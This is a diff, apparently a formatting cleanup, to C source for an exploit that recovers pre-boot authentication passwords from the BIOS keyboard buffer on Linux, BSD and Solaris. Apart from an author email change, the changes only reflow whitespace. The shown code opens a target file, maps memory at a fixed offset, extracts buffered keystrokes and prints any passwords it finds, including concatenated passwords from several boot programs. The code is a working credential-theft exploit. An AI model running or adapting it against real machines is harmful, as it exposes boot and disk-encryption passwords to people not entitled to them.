@@ -2,7 +2,7 @@
 *
 * BIOS keyboard buffer hysteresis generic userland exploit for *nix.
 *
-* // Jonathan Brossard - jonathan@ivizindia.com - endrazine@gmail.com
+* // Jonathan Brossard - jb@endrazine.com - endrazine@gmail.com
 *
 * Tested successfully under various Linux, *BSD and Solaris platforms.
 *
@@ -167,7 +167,9 @@ int main(int argc, char **argv)
 
 
 	fd = open(TARGET_FILE, O_RDONLY);
-	if (fd == -1) {		perror("Fatal error in open ");		exit(-1);
+	if (fd == -1) {
+		perror("Fatal error in open ");
+		exit(-1);
 	}
 
 	int PageSize = (int)sysconf(_SC_PAGESIZE);
@@ -182,26 +184,36 @@ int main(int argc, char **argv)
 	}
 
 	memcpy(tab, map + TARGET_OFFSET - (TARGET_OFFSET & ~0xFFF),32);
-			for (j = 0; j < 16; j++) {		tab2[i] = tab[2 * j];		i++;		
+	
+	
+	for (j = 0; j < 16; j++) {
+		tab2[i] = tab[2 * j];
+		i++;
+		
 		if (tab2[i] <= 0x7e && tab2[i] >= 0x30 )
 			password_flag = 1;
 	}
 
-	if (password_flag) {		printf("--[ Password (to the latest pre boot authentication software) : ");
+	if (password_flag) {
+		printf("--[ Password (to the latest pre boot authentication software) : ");
 	} else {
 		printf("--[ No password found\n\n");
 		exit(0);
 	}
-	for (i = 0; i < 16; i++) {
+
+	for (i = 0; i < 16; i++) {
 
 		/*
 		* We might have several passwords concatenated in case of multiple preboot authentication softs
 		*/
-		if ( i<15 && tab2[i] == 0x0d && tab2[i+1] != 0x0d && tab2[i+1] <= 0x7e && tab2[i+1] >= 0x30 ) {			printf("\n--[ Password (to a previous authentication software) :");
+		if ( i<15 && tab2[i] == 0x0d && tab2[i+1] != 0x0d && tab2[i+1] <= 0x7e && tab2[i+1] >= 0x30 ) {
+			printf("\n--[ Password (to a previous authentication software) :");
 		} else {
-			printf("%c", tab2[i]);		}
+			printf("%c", tab2[i]);
+		}
 	}
-	printf("\n\n");
+
+	printf("\n\n");
 
 	/*
 	* Clean up...
